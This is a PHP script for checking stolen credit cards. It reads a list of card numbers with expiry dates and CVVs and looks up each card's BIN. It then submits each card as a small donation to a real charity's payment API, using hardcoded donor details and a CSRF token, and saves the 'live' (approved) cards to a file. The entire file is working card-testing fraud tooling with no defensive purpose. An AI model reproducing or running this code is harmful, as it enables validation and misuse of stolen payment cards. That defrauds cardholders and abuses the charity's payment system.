<?php

echo "List CC  : ";
$xyz = trim(fgets(STDIN));
foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key => $akun) {
	$pecah = explode("|", trim($akun));
	$card = trim($pecah[0]);
	$month = trim($pecah[1]);
	$year = trim($pecah[2]);
	$cvv = trim($pecah[3]);
		
$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
$headers[] = 'X-NewRelic-ID: VwMBVFRADgoDUldU';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';

$rest = substr("'.$card.'", 2, -12);
// print_r($rest);
$gas = curl('https://binlist.io/lookup/'.$rest.'/', null, null);
$json = json_decode($gas[1], true);
$type = $json['type'];
$cate = $json['category'];
$country = $json['bank']['name'];
$lastCC = substr($card, -4);
$typeCC = (substr($card,0,1) == 4 ? "visa" : (substr($card,0,1) == 3 ? "amex" : (substr($card,0,1) == 5 ? "mc" : null)));
$typeCC2 = (substr($card,0,1) == 4 ? "Visa" : (substr($card,0,1) == 3 ? "Amex" : (substr($card,0,1) == 5 ? "Mastercard" : null)));
// do {
$gas = curl('https://us.movember.com/api/v18/payment', '{"countryCode":"us","locale":"en_US","source":"online","recipientDetails":{"entityType":"general","entityId":97},"donorAddress":{"address1":"jakarta","address2":"jakarta","suburb":"portland","state":"OR","postcode":"97220","countryCode":"us"},"phoneNumber":"(812) 412-3123","donorDetails":{"email":"dowerarts@gmail.com","firstname":"apri","lastname":"amsyah","message":"","receipt":{"isBusiness":false,"businessName":"","firstname":"apri","lastname":"amsyah","taxId":""},"subscribe":true,"confirm_mov_email":""},"tz":"ICT","giftaid":false,"paymentDetails":{"paymentMethod":"card","amount":"5","currency":"USD","transactionFeeEnabled":true,"creditCard":{"cardNumber":"'.$card.'","cardholderName":"apri amsyah","cardCVV":"'.$cvv.'","cardExpiryMonth":"'.$month.'","cardExpiryYear":"'.$year.'","cardType":{"name":"'.$typeCC.'","pattern":{},"valid_length":[16,13]}},"paypal":{},"visaCheckout":{},"masterPass":{},"adyen":{},"directDebit":{}},"donationPrivate":false,"donationAnonymous":false,"cause_id":null,"event_id":null,"recurring":false,"g-recaptcha-response":"","csrfKey":"react-donation-form","csrfToken":"7d442d70a11e9f7c76949403fc48cc430cb8e02cd5417dd86c7e87239e9658b2","browserInfo":{}}', $headers);
if (strpos($gas[1], 'approved')) {
		echo "[Live] [$typeCC2 $type]  $card|$month|$year|$cvv BIN : $cate $country \n";		
		fwrite(fopen("card-live.txt", "a"), "[Live CC] | $card|$month|$year|$cvv\n");
		// print_r($gas[1]);
	} if (strpos($gas[1], 'The transaction was Declined (BR)')) {
		echo "[Die] [$typeCC2 $type]  $card|$month|$year|$cvv BIN : $cate $country \n";
		// print_r($gas[1]);
	}
}
// } while($gas != “unknown”);


function curl($url,$post,$headers)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	$result = curl_exec($ch);
	$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
	$cookies = array();
	foreach($matches[1] as $item) {
	  parse_str($item, $cookie);
	  $cookies = array_merge($cookies, $cookie);
	}
	return array (
	$header,
	$body,
	$cookies
	);
}
